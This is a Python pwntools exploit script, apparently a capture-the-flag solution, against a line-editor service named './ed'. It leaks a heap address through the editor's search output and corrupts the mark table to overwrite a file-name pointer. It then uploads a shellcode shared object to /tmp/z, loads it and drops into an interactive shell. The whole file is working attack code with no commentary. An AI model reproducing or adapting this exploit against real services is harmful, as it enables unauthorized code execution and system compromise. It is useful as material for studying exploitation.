from pwn import *

context.log_level = "DEBUG"
#context.log_level = "ERROR"

prog = "./ed"
is_remote = False

elf = ELF(prog)

r = None
if is_remote:
    r = remote("8.8.8.8", 69)
else:
    r = remote("localhost", 8000)
pause()

r.recvuntil(":")

r.sendline("a")
for i in range(0, 3):
	r.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
r.sendline("DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD")
r.sendline(".")
r.recvuntil(":")
r.sendline("$d")
r.recvuntil(":")
r.sendline(",j")
r.recvuntil(":")

for i in range(0, 0x10):
    r.sendline("!" + "B" * 16)
    r.recvuntil(":")

mem_space_lookup = {}
max_num = 0
for c in range(1, 255):
    if c == 0xa:
        continue

    r.sendline(",/" + chr(c) + "/")
    char_finds = r.recvuntil(":").strip()
    if char_finds == ":":
        continue

    nums = []
    for line in char_finds.split("\n"):
        if line == ":":
            continue

        tmp = map(int, line.split(", "))
        if tmp[0] == 3:
            nums.append(tmp[1])
            if max_num < tmp[1]:
                max_num = tmp[1]

    mem_space_lookup[c] = nums

mem_space = [0 for c in range(0, max_num + 1)]
for c, idxes in mem_space_lookup.iteritems():
    for idx in idxes:
        mem_space[idx] = c

heap_leak = u64("".join([chr(mem_space[c]) for c in range(16, 24)]))
print hex(heap_leak)

file_name_ptr = heap_leak - 208

# Fake load file to reset things
r.sendline("e a")

# Add 255 lines
r.sendline("a")
for i in range(0, 255):
	r.sendline("/tmp/z\x00")
r.sendline(".")

# Fill up mark table
for i in range(0, 255):
	r.sendline("0k\x01")
r.sendline("{}k\x01".format(0xfffffffd))
r.sendline("{}k\x01".format(file_name_ptr))

# Fake load file to reset things
r.sendline("e a")

with open("shellcode.so", "r") as f:
    shared_obj_data = f.read()

# Send shared obj
r.sendline("a")
r.send(shared_obj_data)
r.send("\n")
r.sendline(".")

r.sendline("w /tmp/z")
r.sendline("e /tmp/z")

r.interactive()
